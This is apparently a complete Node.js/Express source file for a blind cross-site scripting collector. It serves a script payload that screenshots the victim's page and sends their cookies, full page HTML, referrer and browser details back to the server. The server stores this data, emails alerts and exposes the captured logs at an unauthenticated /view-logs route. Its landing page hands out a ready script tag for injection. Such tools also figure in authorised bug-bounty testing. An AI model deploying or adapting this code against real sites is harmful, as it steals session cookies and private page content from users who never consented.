require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json({ limit: '15mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/screenshots', express.static(path.join(__dirname, 'screenshots')));

if (!fs.existsSync('screenshots')) {
  fs.mkdirSync('screenshots');
}

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.get('/xss.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
    (function(){
      var s = document.createElement('script');
      s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
      s.onload = function() {
        html2canvas(document.body).then(function(canvas) {
          fetch('https://${req.headers.host}/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              screenshot: canvas.toDataURL('image/png'),
              cookies: document.cookie,
              userAgent: navigator.userAgent,
              referer: document.referrer,
              origin: location.origin,
              html: document.documentElement.outerHTML,
              iframe: window.self !== window.top,
              time: new Date().toISOString()
            })
          });
        });
      };
      document.head.appendChild(s);
    })();
  `);
});

app.post('/collect', async (req, res) => {
  const {
    screenshot, cookies, userAgent, referer,
    origin, html, iframe, time
  } = req.body;

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  let screenshotPath = null;
  if (screenshot) {
    const base64Data = screenshot.replace(/^data:image\/png;base64,/, "");
    screenshotPath = `screenshots/screenshot-${Date.now()}.png`;
    fs.writeFileSync(screenshotPath, base64Data, 'base64');
  }

  const logEntry = {
    ip,
    userAgent,
    referer,
    origin,
    cookies,
    html,
    iframe,
    time,
    screenshot: screenshotPath
  };

  // Append log
  fs.appendFileSync('logs.txt', JSON.stringify(logEntry) + "\n");

  // Send email alert
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_TO,
    subject: 'Blind XSS Triggered!',
    text: `XSS Triggered from IP: ${ip}\nData: ${JSON.stringify(logEntry, null, 2)}`
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('Email sent!');
  } catch (error) {
    console.error('Error sending email:', error);
  }

  console.log("🚨 Blind XSS Triggered:", logEntry);
  res.status(200).send('OK');
});

app.get('/', (req, res) => {
  res.send(`
    <h2>🔍 Blind XSS Collector is Running!</h2>
    <p>Use this payload:</p>
    <pre>&lt;script src="https://${req.headers.host}/xss.js"&gt;&lt;/script&gt;</pre>
    <p>Check logs at <a href="/view-logs">/view-logs</a></p>
  `);
});

app.get('/view-logs', (req, res) => {
  const logs = fs.existsSync('logs.txt') ? fs.readFileSync('logs.txt', 'utf8') : 'No logs yet.';
  res.setHeader('Content-Type', 'text/plain');
  res.send(logs);
});

app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
});
